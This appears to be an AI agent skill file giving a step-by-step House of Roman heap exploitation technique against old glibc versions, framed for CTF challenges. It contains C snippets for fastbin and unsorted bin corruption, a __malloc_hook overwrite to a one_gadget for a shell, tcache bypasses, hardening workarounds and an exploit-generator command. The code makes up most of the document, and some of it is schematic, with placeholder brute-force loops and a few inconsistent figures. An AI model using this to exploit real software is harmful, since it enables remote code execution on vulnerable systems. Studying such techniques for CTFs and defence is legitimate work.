---
name: house-of-roman-exploit
description: Exploit glibc heap vulnerabilities using House of Roman attack for RCE without leaks. Use this skill whenever the user mentions heap exploitation, glibc 2.23-2.27, fastbin attacks, unsorted bin attacks, malloc hook overwrites, or needs to achieve code execution in CTF challenges with old libc versions. Trigger for any heap-based binary exploitation task where the target uses glibc 2.23-2.27 and you need RCE without prior information leaks.
---

# House of Roman Exploit

A heap exploitation technique that achieves **RCE without leaks** by combining fastbin manipulation, unsorted bin attacks, and relative pointer overwrites.

## When to Use This Attack

**Target glibc versions:** 2.23–2.27 (reliable), 2.28+ (unreliable due to unsorted bin hardening)

**Prerequisites:**
- Ability to edit fastbin `fd` pointers (UAF, write primitive)
- Ability to edit unsorted bin `bk` pointers (UAF)
- Target has `__malloc_hook` available (glibc < 2.34)
- 12 bits of brute force acceptable (0.02% success rate per attempt)

**Don't use if:**
- glibc ≥ 2.34 (hooks removed)
- Tcache enabled without draining (glibc ≥ 2.26)
- You need 100% reliable exploitation

## Attack Overview

```
Phase 1: Fastbin → __malloc_hook
  ├─ Create fastbin victim chunk
  ├─ Create fake libc chunk with main_arena pointer
  ├─ Brute force last 4 bits to align to __malloc_hook
  └─ Allocate chunk at __malloc_hook

Phase 2: Unsorted Bin Write
  ├─ Place chunk in unsorted bin
  ├─ Use UAF to set bk = __malloc_hook address
  └─ malloc() writes main_arena+0x68 to __malloc_hook

Phase 3: One Gadget Overwrite
  ├─ Partial overwrite malloc_hook_chunk
  ├─ Brute force 12 bits for one_gadget address
  └─ malloc() triggers one_gadget → RCE
```

## Step-by-Step Exploitation

### Phase 1: Point Fastbin to __malloc_hook

```c
// 1. Create heap layout
void* fastbin_victim = malloc(0x60);      // 0x0: UAF victim
void* alignment = malloc(0x80);           // 0x70: alignment
void* main_arena_use = malloc(0x80);      // 0x100: will hold arena ptr
void* relative_offset = malloc(0x60);     // 0x190: relative offset

// 2. Free main_arena_use → unsorted bin (fd/bk = main_arena+0x68)
free(main_arena_use);

// 3. Allocate fake libc chunk (gets main_arena+0x68 in fd/bk)
void* fake_libc_chunk = malloc(0x60);

// 4. Free victim chunks
free(relative_offset);
free(fastbin_victim);

// 5. Brute force: edit fastbin_victim.fd last byte
//    Goal: fastbin_victim → fake_libc_chunk → (__malloc_hook - 0x23)
//    16 possibilities (4 bits random)
while (true) {
    // Restart program until alignment works
    // Check: fastbin_victim.fd ends with correct byte
}

// 6. Allocate to get chunk at __malloc_hook
malloc(0x60);  // consumes fastbin_victim
malloc(0x60);  // consumes relative_offset
void* malloc_hook_chunk = malloc(0x60);  // AT __malloc_hook!
```

### Phase 2: Unsorted Bin Write to __malloc_hook

```c
// 1. Create unsorted bin chunk
void* unsorted_chunk = malloc(0x80);
malloc(0x30);  // prevent consolidation

// 2. Free to create UAF
free(unsorted_chunk);

// 3. Use UAF to set bk = __malloc_hook address
//    (you already have this address from Phase 1 brute force)
*(uint64_t*)(unsorted_chunk + 0x10) = malloc_hook_addr;  // bk field

// 4. Trigger write: malloc writes main_arena+0x68 to __malloc_hook
malloc(0x80);  // CRITICAL: must match freed size!

// Now __malloc_hook contains main_arena+0x68 address
```

### Phase 3: Overwrite to One Gadget

```c
// 1. malloc_hook_chunk contains main_arena+0x68
// 2. Partial overwrite to point to one_gadget
// 3. Brute force 12 bits (0.02% success rate)

while (true) {
    // Restart until 12 bits align
    // Overwrite last 1.5 bytes of malloc_hook_chunk
    *(uint64_t*)malloc_hook_chunk = one_gadget_addr;
    
    // 4. Trigger RCE
    malloc(0x60);  // calls __malloc_hook → one_gadget → shell
}
```

## Complete Template

Use `scripts/scaffold_house_of_roman.py` to generate a complete exploit template:

```bash
python scripts/scaffold_house_of_roman.py \
  --libc-path libc.so.6 \
  --one-gadget 0x4f315 \
  --output exploit.py
```

## Modern Considerations

### Tcache (glibc ≥ 2.26)

Tcache will consume your 0x70 allocations. **Disable before any allocation:**

```c
setenv("GLIBC_TUNABLES", "glibc.malloc.tcache_count=0", 1);
```

Or drain tcache by filling each bin with 7 frees:

```c
for (int i = 0; i < 7; i++) {
    void* p = malloc(0x70);
    free(p);
}
```

### Safe-Linking (glibc ≥ 2.32)

Safe-linking does **not** prevent House of Roman because:
- Attack uses **partial pointer overwrite** of existing libc addresses
- Never forges fresh pointers (safe-linking only protects new pointers)
- Real blocker is hook removal + unsorted bin checks

### Unsorted Bin Hardening (glibc ≥ 2.28)

Patch adds integrity checks on unsorted chunks:
- Size sanity validation
- List linkage verification

**Workaround:** Keep `fd/bk` links consistent and sizes plausible. Requires stronger primitives than simple partial overwrite.

### Hook Removal (glibc ≥ 2.34)

`__malloc_hook` and `__free_hook` removed. **Adaptations:**

1. **Target GOT entries** in non-PIE binaries (e.g., `exit@GOT`)
2. **House of Pie style** top-chunk hijack to control `top` instead
3. **Fastbin to __free_hook** (pre-2.34 only, see romanking98 writeup)

## Debugging Checklist

- [ ] Verify glibc version: `ldd --version` or check `libc.so.6` timestamp
- [ ] Confirm tcache disabled or drained
- [ ] Check fastbin sizes match (0x70 for 0x60 allocation)
- [ ] Verify UAF primitive works (can write to freed chunks)
- [ ] Confirm `__malloc_hook` exists: `nm libc.so.6 | grep malloc_hook`
- [ ] Test brute force alignment (run multiple times)
- [ ] Validate one_gadget works: `one_gadget --libc libc.so.6`

## Common Pitfalls

| Symptom | Cause | Fix |
|---------|-------|-----|
| Crash on malloc | Tcache not disabled | Add `setenv` or drain tcache |
| Wrong address written | Unsorted bin size mismatch | Ensure malloc size matches freed size |
| No RCE | 12-bit brute force failed | Restart program, try again |
| Segfault immediately | Safe-linking corruption | Verify fd/bk consistency |
| Hook not overwritten | Wrong bk address | Double-check __malloc_hook address |

## References

- [how2heap house_of_roman.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_roman.c)
- [CTF Wiki House of Roman](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_roman/)
- [Synacktiv Heap Tricks](https://halloween.synacktiv.com/publications/heap-tricks-never-get-old-insomnihack-teaser-2022.html)
- [romanking98 writeup](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc)
- [glibc 2.34 NEWS](https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=NEWS;hb=glibc-2.34)
- [Unsorted bin patch](https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c)
